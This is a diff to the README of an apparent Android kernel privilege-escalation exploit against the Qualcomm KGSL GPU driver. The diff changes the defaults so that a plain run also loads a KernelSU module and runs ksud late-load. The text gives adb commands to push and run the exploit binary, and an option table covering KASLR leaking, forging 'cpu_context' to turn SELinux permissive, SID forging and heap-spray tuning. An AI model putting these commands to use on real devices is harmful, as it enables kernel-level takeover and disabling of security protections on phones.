@@ -15,11 +15,15 @@ make PROJECT=sog02-58.2.C.3.127 NDK_ROOT="$NDK"
 adb push build/sog02-58.2.C.3.127/kgsl_root_su /data/local/tmp/kgsl_root_su
 adb push kernelsu.ko /data/local/tmp/kernelsu.ko      # see KernelSU late-load
 adb shell 'chmod 755 /data/local/tmp/kgsl_root_su; \
-  INJECT_KO=/data/local/tmp/kernelsu.ko INJECT_KO_PARAMS=allow_shell=1 \
   /data/local/tmp/kgsl_root_su'
 adb shell 'getenforce'                                 # Permissive
 adb shell 'cat /proc/modules | grep kernelsu'          # kernelsu ... Live
 ```
+
+A plain run loads `/data/local/tmp/kernelsu.ko` and runs
+`/data/adb/ksud late-load` by default (`INJECT_KO=0` / `LATE_LOAD=0`
+disable either).  The exploit also force-restarts the manager after a
+short delay instead of waiting for the late-load's 35 s stage scripts.
 
 Root comes from the KernelSU userspace (manager/`ksud` su at
 `/data/adb/ksu/bin/ksu`); the exploit no longer ships its own su client or
@@ -43,9 +47,9 @@ scan finds nothing.
 | --- | --- | --- |
 | `SEC_PERMISSIVE` | `1` | clear `selinux_state.enforcing` through the forged `thread.cpu_context`; `0` skips the hijack |
 | `SEC_PERM_TRIGGER` | `1` | `0` performs the dry run: leak KASLR, print the derived addresses, leave the context untouched |
-| `INJECT_KO` | off | path to a KernelSU LKM to late-load from the root child |
+| `INJECT_KO` | `/data/local/tmp/kernelsu.ko` | LKM loaded from the root child; `0` disables |
 | `INJECT_KO_PARAMS` | `allow_shell=1` | module parameters passed to `init_module` |
-| `LATE_LOAD` | off | path to the KernelSU userspace (`/data/adb/ksud`); run `late-load` from the root child so the manager gets a driver fd |
+| `LATE_LOAD` | `/data/adb/ksud` | userspace binary for `late-load`; `0` disables |
 | `KSU_PACKAGE` | `me.weishu.kernelsu` | manager package passed to `late-load` |
 | `SEC_SID=n` | off | forge `task_security_struct` with SID `n` (`1` = `u:r:kernel:s0`); see [SEC_SID.md](SEC_SID.md) |
 | `KGSL_CHILDREN` | auto (8192 on >= 7 GB) | spray children (512..16384) |
@@ -59,10 +63,7 @@ scan finds nothing.
 | `KGSL_ROUNDS` | `8` | exploit rounds (1..16) |
 
 ```sh
-# permissive + KernelSU late-load
-adb shell 'INJECT_KO=/data/local/tmp/kernelsu.ko INJECT_KO_PARAMS=allow_shell=1 /data/local/tmp/kgsl_root_su'
-
-# permissive only
+# default: permissive + LKM + ksud late-load
 adb shell '/data/local/tmp/kgsl_root_su'
 
 # no kernel write
